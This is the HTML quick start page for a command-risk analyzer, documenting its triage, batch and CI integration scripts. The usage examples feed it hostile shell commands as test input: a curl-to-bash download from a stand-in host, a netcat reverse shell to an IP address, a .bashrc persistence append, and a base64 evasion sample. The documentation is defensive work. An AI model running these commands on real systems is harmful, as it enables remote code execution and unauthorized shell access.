@@ -1,0 +1,450 @@
+
+
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" data-content_root="./">
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Quick Start Guide &mdash; Command Safety Analyzer 5.0.0 documentation</title>
+      <link rel="stylesheet" type="text/css" href="_static/pygments.css?v=b86133f3" />
+      <link rel="stylesheet" type="text/css" href="_static/css/theme.css?v=9edc463e" />
+
+  
+      <script src="_static/jquery.js?v=5d32c60e"></script>
+      <script src="_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+      <script src="_static/documentation_options.js?v=ce74c6a2"></script>
+      <script src="_static/doctools.js?v=fd6eb6e6"></script>
+      <script src="_static/sphinx_highlight.js?v=6ffebe34"></script>
+    <script src="_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="genindex.html" />
+    <link rel="search" title="Search" href="search.html" />
+    <link rel="next" title="Architecture Overview" href="architecture.html" />
+    <link rel="prev" title="Installation Guide" href="installation.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="index.html" class="icon icon-home">
+            Command Safety Analyzer
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="installation.html">Installation Guide</a></li>
+<li class="toctree-l1 current"><a class="current reference internal" href="#">Quick Start Guide</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="#basic-usage">Basic Usage</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#single-command-analysis">Single Command Analysis</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#fast-triage-mode">Fast Triage Mode</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#batch-processing">Batch Processing</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#run-all-samples">Run All Samples</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#custom-batch-jobs">Custom Batch Jobs</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#understanding-results">Understanding Results</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#verdict-levels">Verdict Levels</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#sample-output">Sample Output</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#performance-optimization">Performance Optimization</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#speed-up-analysis">Speed Up Analysis</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#resource-management">Resource Management</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#integration-examples">Integration Examples</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#ci-cd-pipeline">CI/CD Pipeline</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#api-gateway">API Gateway</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#web-application">Web Application</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#advanced-features">Advanced Features</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#custom-scoring">Custom Scoring</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#pattern-testing">Pattern Testing</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#common-use-cases">Common Use Cases</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#development-security">1. Development Security</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#incident-response">2. Incident Response</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#security-research">3. Security Research</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#next-steps">Next Steps</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#getting-help">Getting Help</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="architecture.html">Architecture Overview</a></li>
+<li class="toctree-l1"><a class="reference internal" href="api/index.html">API Reference</a></li>
+<li class="toctree-l1"><a class="reference internal" href="modules/index.html">Module Documentation</a></li>
+<li class="toctree-l1"><a class="reference internal" href="performance.html">Performance Optimization Guide</a></li>
+<li class="toctree-l1"><a class="reference internal" href="integration.html">Integration Guide</a></li>
+<li class="toctree-l1"><a class="reference internal" href="changelog.html">Changelog</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="index.html">Command Safety Analyzer</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="index.html" class="icon icon-home" aria-label="Home"></a></li>
+      <li class="breadcrumb-item active">Quick Start Guide</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="_sources/quickstart.md.txt" rel="nofollow"> View page source</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section class="tex2jax_ignore mathjax_ignore" id="quick-start-guide">
+<h1>Quick Start Guide<a class="headerlink" href="#quick-start-guide" title="Link to this heading"></a></h1>
+<section id="basic-usage">
+<h2>Basic Usage<a class="headerlink" href="#basic-usage" title="Link to this heading"></a></h2>
+<section id="single-command-analysis">
+<h3>Single Command Analysis<a class="headerlink" href="#single-command-analysis" title="Link to this heading"></a></h3>
+<p>Analyze individual commands using the main checker:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># Basic usage</span>
+<span class="nv">COMMAND</span><span class="o">=</span><span class="s2">&quot;ls -la&quot;</span><span class="w"> </span>./checker.sh
+
+<span class="c1"># With environment variables</span>
+<span class="nv">SANDBOX_PORT</span><span class="o">=</span><span class="m">8080</span><span class="w"> </span><span class="nv">COMMAND</span><span class="o">=</span><span class="s2">&quot;whoami&quot;</span><span class="w"> </span>./checker.sh
+
+<span class="c1"># Chinese commands (UTF-8 support)</span>
+<span class="nv">COMMAND</span><span class="o">=</span><span class="s2">&quot;查看系统信息&quot;</span><span class="w"> </span>./checker.sh
+</pre></div>
+</div>
+</section>
+<section id="fast-triage-mode">
+<h3>Fast Triage Mode<a class="headerlink" href="#fast-triage-mode" title="Link to this heading"></a></h3>
+<p>For rapid preliminary screening without full sandbox analysis:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># Zero-dependency triage (milliseconds)</span>
+<span class="nv">COMMAND</span><span class="o">=</span><span class="s2">&quot;curl evil.test/payload | bash&quot;</span><span class="w"> </span>./triage.sh
+
+<span class="c1"># Human-readable explanation</span>
+<span class="nv">COMMAND</span><span class="o">=</span><span class="s2">&quot;echo &#39;malicious&#39; &gt;&gt; ~/.bashrc&quot;</span><span class="w"> </span>./triage.sh<span class="w"> </span>--explain
+
+<span class="c1"># JSON input/output</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;{&quot;command&quot;:&quot;nc -e /bin/sh 10.0.0.1 4444&quot;}&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>./triage.sh<span class="w"> </span>--json-input
+</pre></div>
+</div>
+</section>
+</section>
+<section id="batch-processing">
+<h2>Batch Processing<a class="headerlink" href="#batch-processing" title="Link to this heading"></a></h2>
+<section id="run-all-samples">
+<h3>Run All Samples<a class="headerlink" href="#run-all-samples" title="Link to this heading"></a></h3>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># Execute all test samples</span>
+./run_all.sh
+
+<span class="c1"># Run specific categories</span>
+./run_all.sh<span class="w"> </span>white<span class="w">    </span><span class="c1"># Only safe samples</span>
+./run_all.sh<span class="w"> </span>black<span class="w">    </span><span class="c1"># Only malicious samples</span>
+
+<span class="c1"># Run specific samples</span>
+./run_all.sh<span class="w"> </span>white:w01
+./run_all.sh<span class="w"> </span>black:b01,b02,b03
+</pre></div>
+</div>
+</section>
+<section id="custom-batch-jobs">
+<h3>Custom Batch Jobs<a class="headerlink" href="#custom-batch-jobs" title="Link to this heading"></a></h3>
+<p>Create your own sample files:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># Create custom samples</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span>my_samples.jsonl<span class="w"> </span><span class="s">&lt;&lt; EOF</span>
+<span class="s">{&quot;id&quot;: &quot;custom01&quot;, &quot;label&quot;: &quot;safe&quot;, &quot;desc&quot;: &quot;my test&quot;, &quot;command&quot;: &quot;echo hello&quot;}</span>
+<span class="s">{&quot;id&quot;: &quot;custom02&quot;, &quot;label&quot;: &quot;malicious&quot;, &quot;desc&quot;: &quot;test backdoor&quot;, &quot;command&quot;: &quot;nc -e sh&quot;}</span>
+<span class="s">EOF</span>
+
+<span class="c1"># Run custom samples</span>
+<span class="nv">JOBS_FILE</span><span class="o">=</span>my_samples.jsonl<span class="w"> </span>./run_all.sh
+</pre></div>
+</div>
+</section>
+</section>
+<section id="understanding-results">
+<h2>Understanding Results<a class="headerlink" href="#understanding-results" title="Link to this heading"></a></h2>
+<section id="verdict-levels">
+<h3>Verdict Levels<a class="headerlink" href="#verdict-levels" title="Link to this heading"></a></h3>
+<p>The analyzer produces four verdict levels:</p>
+<table class="docutils align-default">
+<thead>
+<tr class="row-odd"><th class="head"><p>Level</p></th>
+<th class="head"><p>Score Range</p></th>
+<th class="head"><p>Meaning</p></th>
+<th class="head"><p>Action</p></th>
+</tr>
+</thead>
+<tbody>
+<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">LIKELY_SAFE</span></code></p></td>
+<td><p>0-9</p></td>
+<td><p>No suspicious behavior</p></td>
+<td><p>Allow</p></td>
+</tr>
+<tr class="row-odd"><td><p><code class="docutils literal notranslate"><span class="pre">LOW_RISK</span></code></p></td>
+<td><p>10-24</p></td>
+<td><p>Minor anomalies</p></td>
+<td><p>Review/Allow</p></td>
+</tr>
+<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">SUSPICIOUS</span></code></p></td>
+<td><p>25-59</p></td>
+<td><p>Clear suspicious patterns</p></td>
+<td><p>Manual review</p></td>
+</tr>
+<tr class="row-odd"><td><p><code class="docutils literal notranslate"><span class="pre">DANGEROUS</span></code></p></td>
+<td><p>60-100</p></td>
+<td><p>Multiple high-risk indicators</p></td>
+<td><p>Block</p></td>
+</tr>
+</tbody>
+</table>
+</section>
+<section id="sample-output">
+<h3>Sample Output<a class="headerlink" href="#sample-output" title="Link to this heading"></a></h3>
+<div class="highlight-json notranslate"><div class="highlight"><pre><span></span><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;version&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;5.0.0&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;command&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;curl evil.test/payload | bash&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;verdict&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;DANGEROUS&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;risk_score&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">75</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;confidence&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;HIGH&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;findings&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;dimension&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;网络行为&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;severity&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;CRITICAL&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;description&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;连接到外部 C2 服务器&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;mitre_attack&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;T1071&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">]</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+</section>
+</section>
+<section id="performance-optimization">
+<h2>Performance Optimization<a class="headerlink" href="#performance-optimization" title="Link to this heading"></a></h2>
+<section id="speed-up-analysis">
+<h3>Speed Up Analysis<a class="headerlink" href="#speed-up-analysis" title="Link to this heading"></a></h3>
+<ol class="arabic">
+<li><p><strong>Increase Concurrency</strong></p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">export</span><span class="w"> </span><span class="nv">MAX_CONCURRENT_JOBS</span><span class="o">=</span><span class="m">8</span>
+./run_all.sh
+</pre></div>
+</div>
+</li>
+<li><p><strong>Use Fast Triage First</strong></p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># Screen obvious cases first</span>
+./triage.sh<span class="w"> </span>--batch<span class="w"> </span>&lt;<span class="w"> </span>commands.txt
+<span class="c1"># Then run full analysis on suspicious ones</span>
+</pre></div>
+</div>
+</li>
+<li><p><strong>Optimize Docker</strong></p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># Pre-pull images</span>
+docker<span class="w"> </span>pull<span class="w"> </span>opensandbox/code-interpreter:v1.0.2
+
+<span class="c1"># Use registry mirror for faster pulls</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">REGISTRY_MIRROR</span><span class="o">=</span>your-mirror
+</pre></div>
+</div>
+</li>
+</ol>
+</section>
+<section id="resource-management">
+<h3>Resource Management<a class="headerlink" href="#resource-management" title="Link to this heading"></a></h3>
+<p>Monitor resource usage:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># Check memory usage</span>
+free<span class="w"> </span>-h
+
+<span class="c1"># Monitor Docker containers</span>
+docker<span class="w"> </span>stats<span class="w"> </span>--no-stream
+
+<span class="c1"># View analysis logs</span>
+tail<span class="w"> </span>-f<span class="w"> </span>reports/white/w01.log
+</pre></div>
+</div>
+</section>
+</section>
+<section id="integration-examples">
+<h2>Integration Examples<a class="headerlink" href="#integration-examples" title="Link to this heading"></a></h2>
+<section id="ci-cd-pipeline">
+<h3>CI/CD Pipeline<a class="headerlink" href="#ci-cd-pipeline" title="Link to this heading"></a></h3>
+<div class="highlight-yaml notranslate"><div class="highlight"><pre><span></span><span class="c1"># GitHub Actions example</span>
+<span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Security Scan</span>
+<span class="w">  </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">|</span>
+<span class="w">    </span><span class="no">COMMAND=&quot;${{ github.event.inputs.command }}&quot; ./checker.sh</span>
+<span class="w">    </span><span class="no"># Exit codes: 0=SAFE, 1=SUSPICIOUS, 2=DANGEROUS</span>
+</pre></div>
+</div>
+</section>
+<section id="api-gateway">
+<h3>API Gateway<a class="headerlink" href="#api-gateway" title="Link to this heading"></a></h3>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># Simple API integration</span>
+<span class="nv">user_input</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$1</span><span class="s2">&quot;</span>
+<span class="nv">result</span><span class="o">=</span><span class="k">$(</span><span class="nv">COMMAND</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$user_input</span><span class="s2">&quot;</span><span class="w"> </span>./triage.sh<span class="k">)</span>
+<span class="k">case</span><span class="w"> </span><span class="nv">$?</span><span class="w"> </span><span class="k">in</span>
+<span class="w">    </span><span class="m">0</span><span class="o">)</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;ALLOW&quot;</span><span class="p">;;</span>
+<span class="w">    </span><span class="m">1</span><span class="o">)</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;REVIEW&quot;</span><span class="p">;;</span>
+<span class="w">    </span><span class="m">2</span><span class="o">)</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;BLOCK&quot;</span><span class="p">;;</span>
+<span class="k">esac</span>
+</pre></div>
+</div>
+</section>
+<section id="web-application">
+<h3>Web Application<a class="headerlink" href="#web-application" title="Link to this heading"></a></h3>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span><span class="w"> </span><span class="nn">subprocess</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">analyze_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
+        <span class="p">[</span><span class="s1">&#39;./triage.sh&#39;</span><span class="p">],</span>
+        <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;COMMAND&#39;</span><span class="p">:</span> <span class="n">cmd</span><span class="p">},</span>
+        <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+        <span class="n">text</span><span class="o">=</span><span class="kc">True</span>
+    <span class="p">)</span>
+    <span class="k">return</span> <span class="p">{</span>
+        <span class="s1">&#39;verdict&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;PASS&#39;</span><span class="p">,</span> <span class="s1">&#39;REVIEW&#39;</span><span class="p">,</span> <span class="s1">&#39;BLOCK&#39;</span><span class="p">][</span><span class="n">result</span><span class="o">.</span><span class="n">returncode</span><span class="p">],</span>
+        <span class="s1">&#39;details&#39;</span><span class="p">:</span> <span class="n">result</span><span class="o">.</span><span class="n">stdout</span>
+    <span class="p">}</span>
+</pre></div>
+</div>
+</section>
+</section>
+<section id="advanced-features">
+<h2>Advanced Features<a class="headerlink" href="#advanced-features" title="Link to this heading"></a></h2>
+<section id="custom-scoring">
+<h3>Custom Scoring<a class="headerlink" href="#custom-scoring" title="Link to this heading"></a></h3>
+<p>Modify <code class="docutils literal notranslate"><span class="pre">scoring.conf</span></code> to tune sensitivity:</p>
+<div class="highlight-ini notranslate"><div class="highlight"><pre><span></span><span class="c1"># Lower thresholds for stricter detection</span>
+<span class="na">DANGEROUS_THRESHOLD</span><span class="o">=</span><span class="s">40</span>
+<span class="na">SUSPICIOUS_THRESHOLD</span><span class="o">=</span><span class="s">15</span>
+
+<span class="c1"># Adjust behavior tolerances</span>
+<span class="na">HIDDEN_PROC_TOLERANCE</span><span class="o">=</span><span class="s">5</span>
+<span class="na">ENTROPY_THRESHOLD</span><span class="o">=</span><span class="s">5.0</span>
+</pre></div>
+</div>
+</section>
+<section id="pattern-testing">
+<h3>Pattern Testing<a class="headerlink" href="#pattern-testing" title="Link to this heading"></a></h3>
+<p>Validate detection patterns:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># Run pattern validation suite</span>
+./test_patterns.sh
+
+<span class="c1"># Verbose output</span>
+./test_patterns.sh<span class="w"> </span>--verbose
+
+<span class="c1"># Test specific categories</span>
+./test_patterns.sh<span class="w"> </span>--category<span class="w"> </span>reverse-shell
+</pre></div>
+</div>
+</section>
+</section>
+<section id="common-use-cases">
+<h2>Common Use Cases<a class="headerlink" href="#common-use-cases" title="Link to this heading"></a></h2>
+<section id="development-security">
+<h3>1. Development Security<a class="headerlink" href="#development-security" title="Link to this heading"></a></h3>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># Analyze deployment scripts</span>
+<span class="nv">COMMAND</span><span class="o">=</span><span class="s2">&quot;</span><span class="k">$(</span>cat<span class="w"> </span>deploy.sh<span class="k">)</span><span class="s2">&quot;</span><span class="w"> </span>./checker.sh
+
+<span class="c1"># Check CI/CD pipeline commands</span>
+./run_all.sh<span class="w"> </span>ci-cmds.jsonl
+</pre></div>
+</div>
+</section>
+<section id="incident-response">
+<h3>2. Incident Response<a class="headerlink" href="#incident-response" title="Link to this heading"></a></h3>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># Analyze suspicious commands from logs</span>
+<span class="k">while</span><span class="w"> </span><span class="nb">read</span><span class="w"> </span>cmd<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">    </span><span class="nv">COMMAND</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$cmd</span><span class="s2">&quot;</span><span class="w"> </span>./checker.sh
+<span class="k">done</span><span class="w"> </span>&lt;<span class="w"> </span>suspicious_commands.log
+</pre></div>
+</div>
+</section>
+<section id="security-research">
+<h3>3. Security Research<a class="headerlink" href="#security-research" title="Link to this heading"></a></h3>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># Test evasion techniques</span>
+<span class="nv">COMMAND</span><span class="o">=</span><span class="s2">&quot;base64 -d &lt;&lt;&lt; &#39;malicious&#39;&quot;</span><span class="w"> </span>./checker.sh
+
+<span class="c1"># Compare different analysis engines</span>
+./benchmark.sh<span class="w"> </span>--compare
+</pre></div>
+</div>
+</section>
+</section>
+<section id="next-steps">
+<h2>Next Steps<a class="headerlink" href="#next-steps" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p>Explore <a class="reference internal" href="architecture.html"><span class="doc">Architecture Overview</span></a> to understand how the analyzer works</p></li>
+<li><p>Review <a class="reference internal" href="api/index.html"><span class="doc">API Reference</span></a> for programmatic usage</p></li>
+<li><p>Check <a class="reference internal" href="performance.html"><span class="doc">Performance Optimization Guide</span></a> for optimization strategies</p></li>
+<li><p>See <a class="reference internal" href="integration.html"><span class="doc">Integration Guide</span></a> for deployment patterns</p></li>
+</ul>
+</section>
+<section id="getting-help">
+<h2>Getting Help<a class="headerlink" href="#getting-help" title="Link to this heading"></a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># Built-in help</span>
+./checker.sh<span class="w"> </span>--help
+./triage.sh<span class="w"> </span>--help
+./run_all.sh<span class="w"> </span>--help
+
+<span class="c1"># View documentation</span>
+firefox<span class="w"> </span>docs/build/html/index.html
+</pre></div>
+</div>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
+        <a href="installation.html" class="btn btn-neutral float-left" title="Installation Guide" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
+        <a href="architecture.html" class="btn btn-neutral float-right" title="Architecture Overview" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2026, Security Team.</p>
+  </div>
+
+  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    provided by <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
